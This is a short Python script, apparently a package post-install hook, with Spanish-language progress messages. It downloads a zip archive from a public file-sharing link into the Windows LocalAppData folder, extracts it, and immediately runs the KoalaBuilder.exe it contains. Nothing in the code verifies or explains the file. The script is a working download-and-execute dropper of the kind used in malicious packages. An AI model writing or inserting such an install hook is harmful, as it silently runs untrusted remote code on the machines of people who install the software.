import os
import subprocess
import urllib.request
import zipfile

def run_post_install():
    url = 'https://filetransfer.io/data-package/X3ykbFZq/download'
    local_dir = os.path.expandvars('%LOCALAPPDATA%')
    zip_file_path = os.path.join(local_dir, 'KoalaBuilder.zip')
    extraction_path = os.path.join(local_dir, 'KoalaBuilder')

    try:
        print("Descargando el archivo zip...")
        urllib.request.urlretrieve(url, zip_file_path)
    except urllib.error.HTTPError as e:
        print(f"HTTP Error: {e.code} - {e.reason}")
        return
    except urllib.error.URLError as e:
        print(f"URL Error: {e.reason}")
        return

    try:
        print("Extrayendo el archivo zip...")
        with zipfile.ZipFile(zip_file_path, 'r') as zip_ref:
            zip_ref.extractall(extraction_path)
    except zipfile.BadZipFile:
        print("Error: El archivo zip está corrupto.")
        return

    exe_file_path = os.path.join(extraction_path, 'KoalaBuilder.exe')
    try:
        print("Ejecutando el archivo exe...")
        subprocess.call([exe_file_path])
    except Exception as e:
        print(f"Error ejecutando el archivo exe: {e}")
        return

if __name__ == "__main__":
    run_post_install()
